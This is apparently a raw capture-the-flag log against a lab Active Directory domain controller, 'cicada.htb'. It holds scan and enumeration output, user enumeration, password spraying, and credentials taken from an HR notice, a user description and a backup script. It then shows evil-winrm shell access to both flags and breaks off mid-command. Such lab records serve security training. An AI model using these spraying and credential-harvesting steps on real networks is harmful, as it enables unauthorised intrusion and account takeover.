nmap output:
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-05 20:29 CST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 20:29
Completed NSE at 20:29, 0.00s elapsed
Initiating NSE at 20:29
Completed NSE at 20:29, 0.00s elapsed
Initiating NSE at 20:29
Completed NSE at 20:29, 0.00s elapsed
Initiating Ping Scan at 20:29
Scanning cicada.htb (10.129.202.143) [4 ports]
Completed Ping Scan at 20:29, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 20:29
Scanning cicada.htb (10.129.202.143) [1000 ports]
Discovered open port 135/tcp on 10.129.202.143
Discovered open port 139/tcp on 10.129.202.143
Discovered open port 445/tcp on 10.129.202.143
Discovered open port 53/tcp on 10.129.202.143
Discovered open port 389/tcp on 10.129.202.143
Discovered open port 88/tcp on 10.129.202.143
Discovered open port 593/tcp on 10.129.202.143
Discovered open port 3268/tcp on 10.129.202.143
Discovered open port 3269/tcp on 10.129.202.143
Discovered open port 464/tcp on 10.129.202.143
Discovered open port 636/tcp on 10.129.202.143
Completed SYN Stealth Scan at 20:30, 4.58s elapsed (1000 total ports)
Initiating Service scan at 20:30
Scanning 11 services on cicada.htb (10.129.202.143)
Completed Service scan at 20:30, 45.26s elapsed (11 services on 1 host)
Initiating OS detection (try #1) against cicada.htb (10.129.202.143)
Retrying OS detection (try #2) against cicada.htb (10.129.202.143)
Initiating Traceroute at 20:30
Completed Traceroute at 20:30, 0.05s elapsed
Initiating Parallel DNS resolution of 1 host. at 20:30
Completed Parallel DNS resolution of 1 host. at 20:30, 0.00s elapsed
NSE: Script scanning 10.129.202.143.
Initiating NSE at 20:30
Completed NSE at 20:31, 40.16s elapsed
Initiating NSE at 20:31
Completed NSE at 20:31, 1.68s elapsed
Initiating NSE at 20:31
Completed NSE at 20:31, 0.01s elapsed
Nmap scan report for cicada.htb (10.129.202.143)
Host is up (0.036s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-06 09:30:09Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
|_SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
|_SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
|_SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
|_SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
|_ssl-date: TLS randomness does not represent time
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022 (89%)
Aggressive OS guesses: Microsoft Windows Server 2022 (89%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.004 days (since Thu Dec  5 20:26:22 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-12-06T09:30:55
|_  start_date: N/A
|_clock-skew: 7h00m00s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   35.65 ms 10.10.14.1
2   35.96 ms cicada.htb (10.129.202.143)

NSE: Script Post-scanning.
Initiating NSE at 20:31
Completed NSE at 20:31, 0.00s elapsed
Initiating NSE at 20:31
Completed NSE at 20:31, 0.00s elapsed
Initiating NSE at 20:31
Completed NSE at 20:31, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.60 seconds
           Raw packets sent: 2077 (95.072KB) | Rcvd: 51 (3.296KB)

```

nxc output:
```bash
SMB         10.129.202.143  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
```

enum4linux output:
```bash
ENUM4LINUX - next generation (v1.3.4)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... cicada.htb
[*] Username ......... ''
[*] Random Username .. 'lfoygijf'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 ===================================
|    Listener Scan on cicada.htb    |
 ===================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 ==================================================
|    Domain Information via LDAP for cicada.htb    |
 ==================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: cicada.htb

 =========================================================
|    NetBIOS Names and Workgroup/Domain for cicada.htb    |
 =========================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 =======================================
|    SMB Dialect Check on cicada.htb    |
 =======================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: false
  SMB 2.02: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: true

 =========================================================
|    Domain Information via SMB session for cicada.htb    |
 =========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: CICADA-DC
NetBIOS domain name: CICADA
DNS domain: cicada.htb
FQDN: CICADA-DC.cicada.htb
Derived membership: domain member
Derived domain: CICADA

 =======================================
|    RPC Session Check on cicada.htb    |
 =======================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user
[+] Server allows session using username 'lfoygijf', password ''
[H] Rerunning enumeration with user 'lfoygijf' might give more results

 =================================================
|    Domain Information via RPC for cicada.htb    |
 =================================================
[+] Domain: CICADA
[+] Domain SID: S-1-5-21-917908876-1423158569-3159038727
[+] Membership: domain member

 =============================================
|    OS Information via RPC for cicada.htb    |
 =============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: ''
OS build: '20348'
Native OS: not supported
Native LAN manager: not supported
Platform id: null
Server type: null
Server type string: null

 ===================================
|    Users via RPC on cicada.htb    |
 ===================================
[*] Enumerating users via 'querydispinfo'
[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED
[*] Enumerating users via 'enumdomusers'
[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED

 ====================================
|    Groups via RPC on cicada.htb    |
 ====================================
[*] Enumerating local groups
[-] Could not get groups via 'enumalsgroups domain': STATUS_ACCESS_DENIED
[*] Enumerating builtin groups
[-] Could not get groups via 'enumalsgroups builtin': STATUS_ACCESS_DENIED
[*] Enumerating domain groups
[-] Could not get groups via 'enumdomgroups': STATUS_ACCESS_DENIED

 ====================================
|    Shares via RPC on cicada.htb    |
 ====================================
[*] Enumerating shares
[+] Found 0 share(s) for user '' with password '', try a different user

 =======================================
|    Policies via RPC for cicada.htb    |
 =======================================
[*] Trying port 445/tcp
[-] SMB connection error on port 445/tcp: STATUS_ACCESS_DENIED
[*] Trying port 139/tcp
[-] SMB connection error on port 139/tcp: session failed

 =======================================
|    Printers via RPC for cicada.htb    |
 =======================================
[-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED

Completed after 11.14 seconds
```
rpcclient output:
```bash
rpcclient -U "" -N cicada.htb -c "enumdomusers"
rpcclient -U "" -N cicada.htb -c "enumdomgroups"
rpcclient -U "" -N cicada.htb -c "querydispinfo"
rpcclient -U "" -N cicada.htb -c "getdompwinfo"
result was NT_STATUS_ACCESS_DENIED
result was NT_STATUS_ACCESS_DENIED
result was NT_STATUS_ACCESS_DENIED
result was NT_STATUS_ACCESS_DENIED
```

dig output:
```bash
; <<>> DiG 9.18.28-1~deb12u2-Debian <<>> @10.129.202.143 cicada.htb ANY
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 36924
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;cicada.htb.			IN	ANY

;; ANSWER SECTION:
cicada.htb.		600	IN	A	10.129.202.143
cicada.htb.		3600	IN	NS	cicada-dc.cicada.htb.
cicada.htb.		3600	IN	SOA	cicada-dc.cicada.htb. hostmaster.cicada.htb. 185 900 600 86400 3600
cicada.htb.		600	IN	AAAA	dead:beef::e39f:a57f:39f6:2967

;; ADDITIONAL SECTION:
cicada-dc.cicada.htb.	3600	IN	A	10.129.202.143
cicada-dc.cicada.htb.	3600	IN	AAAA	dead:beef::e39f:a57f:39f6:2967

;; Query time: 36 msec
;; SERVER: 10.129.202.143#53(10.129.202.143) (TCP)
;; WHEN: Thu Dec 05 21:45:38 CST 2024
;; MSG SIZE  rcvd: 198
```

smbclient output:
```bash
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	DEV             Disk      
	HR              Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to cicada.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

smbclient share output:
```bash
└──╼ [★]$ smbclient //cicada.htb/HR -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 07:29:09 2024
  ..                                  D        0  Thu Mar 14 07:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 12:31:48 2024

		4168447 blocks of size 4096. 438686 blocks available
smb: \> get "Notice from HR.txt"
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (8.5 KiloBytes/sec) (average 8.5 KiloBytes/sec)


└──╼ [★]$ smbclient //cicada.htb/DEV -N
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
```

Notice from HR.txt:
```bash
Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

kerbrute user enumeration output:
```bash
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 12/05/24 - Ronnie Flathers @ropnop

2024/12/05 21:21:33 >  Using KDC(s):
2024/12/05 21:21:33 >  	10.129.202.143:88

2024/12/05 21:21:35 >  [+] VALID USERNAME:	 guest@cicada.htb
2024/12/05 21:21:40 >  [+] VALID USERNAME:	 administrator@cicada.htb
2024/12/05 21:22:26 >  [+] VALID USERNAME:	 Guest@cicada.htb
2024/12/05 21:22:27 >  [+] VALID USERNAME:	 Administrator@cicada.htb
```

nxc rid bruteforce output:
```bash
SMB         10.129.202.143  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.202.143  445    CICADA-DC        [+] cicada.htb\guest: 
SMB         10.129.202.143  445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.202.143  445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.129.202.143  445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.129.202.143  445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB         10.129.202.143  445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
SMB         10.129.202.143  445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
SMB         10.129.202.143  445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
SMB         10.129.202.143  445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
SMB         10.129.202.143  445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
SMB         10.129.202.143  445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
SMB         10.129.202.143  445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
SMB         10.129.202.143  445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
SMB         10.129.202.143  445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.202.143  445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.202.143  445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.202.143  445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
SMB         10.129.202.143  445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
SMB         10.129.202.143  445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.202.143  445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.202.143  445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.202.143  445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.202.143  445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB         10.129.202.143  445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB         10.129.202.143  445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.202.143  445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB         10.129.202.143  445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.129.202.143  445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.129.202.143  445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.129.202.143  445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.129.202.143  445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.129.202.143  445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

kerbrute password spraying output:
```bash
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 12/05/24 - Ronnie Flathers @ropnop

2024/12/05 22:52:51 >  Using KDC(s):
2024/12/05 22:52:51 >  	10.129.202.143:88

2024/12/05 22:52:51 >  Done! Tested 14 logins (0 successes) in 0.251 seconds
```

nxc user enumeration password bruteforce output (found user michael.wrightson):
```bash
SMB         10.129.202.143  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.202.143  445    CICADA-DC        [+] cicada.htb\administrator@cicada.htb:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
SMB         10.129.202.143  445    CICADA-DC        [+] cicada.htb\emily.oscars@cicada.htb:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
SMB         10.129.202.143  445    CICADA-DC        [+] cicada.htb\david.orelious@cicada.htb:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
SMB         10.129.202.143  445    CICADA-DC        [+] cicada.htb\michael.wrightson@cicada.htb:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
SMB         10.129.202.143  445    CICADA-DC        [+] cicada.htb\sarah.dantelia@cicada.htb:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
SMB         10.129.202.143  445    CICADA-DC        [+] cicada.htb\john.smoulder@cicada.htb:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
SMB         10.129.202.143  445    CICADA-DC        [-] cicada.htb\administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.202.143  445    CICADA-DC        [-] cicada.htb\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.202.143  445    CICADA-DC        [-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.202.143  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.129.202.143  445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.202.143  445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.202.143  445    CICADA-DC        [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.202.143  445    CICADA-DC        [-] cicada.htb\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
```

enum4linux as user michael.wrightson output (found password for user david.orelious: aRt$Lp#7t*VQ!3):
```bash
 ===================================
|    Users via RPC on cicada.htb    |
 ===================================
[*] Enumerating users via 'querydispinfo'
[+] Found 8 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 8 user(s) via 'enumdomusers'
[+] After merging user results we have 8 user(s) total:
'1104':
  username: john.smoulder
  name: (null)
  acb: '0x00000210'
  description: (null)
'1105':
  username: sarah.dantelia
  name: (null)
  acb: '0x00000210'
  description: (null)
'1106':
  username: michael.wrightson
  name: (null)
  acb: '0x00000210'
  description: (null)
'1108':
  username: david.orelious
  name: (null)
  acb: '0x00000210'
  description: Just in case I forget my password is aRt$Lp#7t*VQ!3
'1601':
  username: emily.oscars
  name: Emily Oscars
  acb: '0x00000210'
  description: (null)
'500':
  username: Administrator
  name: (null)
  acb: '0x00000210'
  description: Built-in account for administering the computer/domain
'501':
  username: Guest
  name: (null)
  acb: '0x00000214'
  description: Built-in account for guest access to the computer/domain
'502':
  username: krbtgt
  name: (null)
  acb: '0x00020011'
  description: Key Distribution Center Service Account
```

smbclient dev share output as user david.orelious:
```bash
└──╼ [★]$ smbclient -U david.orelious@cicada.htb \\\\cicada.htb\\DEV
Password for [david.orelious@cicada.htb]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 07:31:39 2024
  ..                                  D        0  Thu Mar 14 07:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 12:28:22 2024

		4168447 blocks of size 4096. 432431 blocks available
smb: \> get Backup_script.ps1
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (3.6 KiloBytes/sec) (average 3.6 KiloBytes/sec)
```

Backup_Script.ps1 (found password for user emily.oscars):
```powershell
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

user flag:
```bash
└──╼ [★]$ smbclient -U emily.oscars@cicada.htb \\\\cicada.htb\\C$
Password for [emily.oscars@cicada.htb]:
Try "help" to get a list of possible commands.
smb: \> ls
  $Recycle.Bin                      DHS        0  Thu Mar 14 08:24:03 2024
  $WinREAgent                        DH        0  Mon Sep 23 11:16:49 2024
  Documents and Settings          DHSrn        0  Thu Mar 14 14:40:47 2024
  DumpStack.log.tmp                 AHS    12288  Fri Dec  6 03:26:33 2024
  pagefile.sys                      AHS 738197504  Fri Dec  6 03:26:33 2024
  PerfLogs                            D        0  Thu Aug 22 13:45:54 2024
  Program Files                      DR        0  Thu Aug 29 14:32:50 2024
  Program Files (x86)                 D        0  Sat May  8 04:40:21 2021
  ProgramData                       DHn        0  Fri Aug 30 12:32:07 2024
  Recovery                         DHSn        0  Thu Mar 14 14:41:18 2024
  Shares                              D        0  Thu Mar 14 07:21:29 2024
  System Volume Information         DHS        0  Thu Mar 14 06:18:00 2024
  Users                              DR        0  Mon Aug 26 15:11:25 2024
  Windows                             D        0  Mon Sep 23 11:35:40 2024

		4168447 blocks of size 4096. 428008 blocks available
smb: \> cd Users
smb: \Users\> ls
  .                                  DR        0  Mon Aug 26 15:11:25 2024
  ..                                DHS        0  Mon Sep 23 11:52:48 2024
  Administrator                       D        0  Mon Aug 26 15:10:38 2024
  All Users                       DHSrn        0  Sat May  8 03:34:03 2021
  Default                           DHR        0  Thu Mar 14 14:40:47 2024
  Default User                    DHSrn        0  Sat May  8 03:34:03 2021
  desktop.ini                       AHS      174  Sat May  8 03:18:31 2021
  emily.oscars.CICADA                 D        0  Thu Aug 22 16:22:13 2024
  Public                             DR        0  Thu Mar 14 05:45:15 2024

		4168447 blocks of size 4096. 428008 blocks available
smb: \Users\> cd emily.oscars.CICADA
smb: \Users\emily.oscars.CICADA\> ls
  .                                   D        0  Thu Aug 22 16:22:13 2024
  ..                                 DR        0  Mon Aug 26 15:11:25 2024
  AppData                            DH        0  Thu Aug 22 16:22:13 2024
  Application Data                DHSrn        0  Thu Aug 22 16:22:13 2024
  Cookies                         DHSrn        0  Thu Aug 22 16:22:13 2024
  Desktop                            DR        0  Wed Aug 28 12:32:18 2024
  Documents                          DR        0  Thu Aug 22 16:22:13 2024
  Downloads                          DR        0  Sat May  8 03:20:24 2021
  Favorites                          DR        0  Sat May  8 03:20:24 2021
  Links                              DR        0  Sat May  8 03:20:24 2021
  Local Settings                  DHSrn        0  Thu Aug 22 16:22:13 2024
  Music                              DR        0  Sat May  8 03:20:24 2021
  My Documents                    DHSrn        0  Thu Aug 22 16:22:13 2024
  NetHood                         DHSrn        0  Thu Aug 22 16:22:13 2024
  NTUSER.DAT                        AHn   262144  Thu Aug 22 16:28:26 2024
  ntuser.dat.LOG1                   AHS    20480  Thu Aug 22 16:22:12 2024
  ntuser.dat.LOG2                   AHS        0  Thu Aug 22 16:22:12 2024
  NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf    AHS    65536  Thu Aug 22 16:24:27 2024
  NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Thu Aug 22 16:22:12 2024
  NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Thu Aug 22 16:22:12 2024
  ntuser.ini                         HS       20  Thu Aug 22 16:22:13 2024
  Pictures                           DR        0  Sat May  8 03:20:24 2021
  PrintHood                       DHSrn        0  Thu Aug 22 16:22:13 2024
  Recent                          DHSrn        0  Thu Aug 22 16:22:13 2024
  Saved Games                        Dn        0  Sat May  8 03:20:24 2021
  SendTo                          DHSrn        0  Thu Aug 22 16:22:13 2024
  Start Menu                      DHSrn        0  Thu Aug 22 16:22:13 2024
  Templates                       DHSrn        0  Thu Aug 22 16:22:13 2024
  Videos                             DR        0  Sat May  8 03:20:24 2021

		4168447 blocks of size 4096. 428008 blocks available
smb: \Users\emily.oscars.CICADA\> cd Desktop
smb: \Users\emily.oscars.CICADA\Desktop\> ls
  .                                  DR        0  Wed Aug 28 12:32:18 2024
  ..                                  D        0  Thu Aug 22 16:22:13 2024
  user.txt                           AR       34  Fri Dec  6 03:27:37 2024

		4168447 blocks of size 4096. 428007 blocks available
smb: \Users\emily.oscars.CICADA\Desktop\> get user.txt
getting file \Users\emily.oscars.CICADA\Desktop\user.txt of size 34 as user.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)

```

evil-winrm output:
```bash
└──╼ [★]$ evil-winrm -i cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cd ..
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> ls


    Directory: C:\Users\emily.oscars.CICADA


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---         8/28/2024  10:32 AM                Desktop
d-r---         8/22/2024   2:22 PM                Documents
d-r---          5/8/2021   1:20 AM                Downloads
d-r---          5/8/2021   1:20 AM                Favorites
d-r---          5/8/2021   1:20 AM                Links
d-r---          5/8/2021   1:20 AM                Music
d-r---          5/8/2021   1:20 AM                Pictures
d-----          5/8/2021   1:20 AM                Saved Games
d-r---          5/8/2021   1:20 AM                Videos


*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> cd ..
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         8/26/2024   1:10 PM                Administrator
d-----         8/22/2024   2:22 PM                emily.oscars.CICADA
d-r---         3/14/2024   3:45 AM                Public


*Evil-WinRM* PS C:\Users> cd Administrator
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         12/6/2024   1:27 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> download root.txt
                                        
Info: Downloading C:\Users\Administrator\Desktop\root.txt to root.txt
                                        
Info: Download successful!
```

root flag:
```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami /priv

PRIVILEGES INFORMATION
